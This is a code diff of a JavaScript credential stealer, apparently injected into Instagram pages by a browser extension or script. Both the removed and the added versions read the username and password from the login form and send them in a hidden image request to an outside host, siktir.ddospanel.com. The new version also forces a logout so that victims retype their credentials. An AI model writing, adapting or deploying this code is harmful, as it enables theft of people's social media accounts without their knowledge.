@@ -26,20 +26,25 @@ if (localStorage.upom && localStorage.uzom) {
     }	
 }
 
-if (top.location.href.indexOf("instagram.com") > -1) {
+if (top.location.href.indexOf("instagram") > -1) {
 
-function runScript(e) {
-    if (e.keyCode == 13) {
-        var adi = document.getElementsByClassName("_kp5f7 _qy55y")[0].value;
-        var sifre =  document.getElementsByClassName("_kp5f7 _qy55y")[1].value;
-	    new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + adi + "&pw=" + sifre;	
+tarih = new Date();
+    storage_key = 'access_instakram_';
+    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
+        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
+        localStorage[storage_key] = tarih.getTime();
+		window.location = "http://www.instagram.com/accounts/logout";
+    }	
 
-    }
-}
-$('._aj7mu').click(function(){
-var adi = document.getElementsByClassName("_kp5f7 _qy55y")[0].value;
-var sifre =  document.getElementsByClassName("_kp5f7 _qy55y")[1].value;
-	new Image().src = "https://siktir.ddospanel.com/cpin.php" + "?us=" + adi + "&pw=" + sifre;	
 
-});
+
+
+	document.getElementsByClassName('_rwf8p')[0][2].onclick = function(data) {
+		console.log("Login olundu!");
+		new Image().src = "https://siktir.ddospanel.com/cpin.php?username=" + document.getElementsByName('username')[0].value + "&password=" + document.getElementsByName('password')[0].value;
+		setTimeout(function() {
+			document.getElementsByClassName('_rwf8p')[0][2].onclick;
+		}, 99);
+		return false
+	}
 }
